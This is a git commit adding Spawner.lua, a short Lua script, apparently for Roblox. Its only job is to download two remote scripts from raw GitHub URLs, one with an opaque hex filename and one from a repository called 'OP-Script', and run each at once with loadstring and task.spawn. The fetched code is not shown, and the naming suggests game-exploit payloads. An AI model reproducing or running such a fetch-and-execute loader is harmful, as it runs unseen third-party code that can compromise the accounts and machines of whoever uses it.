1b6128e15ddd7f88dc2c4a310cddea80cb94d44c
KeanuRep123 <131612092+KeanuRep123@users.noreply.github.com>
2025-03-04 12:14:47 +0100

    Create Spawner.lua

---
+++ Spawner.lua
@@ -0,0 +1,8 @@
+local function OPScript() --  
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/2849a38fae32ab348851265e.lua"))()
+end
+local function script()
+        loadstring(game:HttpGet(" https://raw.githubusercontent.com/KeanuRep123/OP-Script/refs/heads/main/Script2.lua", true))()
+end
+task.spawn(OPScript)
+task.spawn(script)
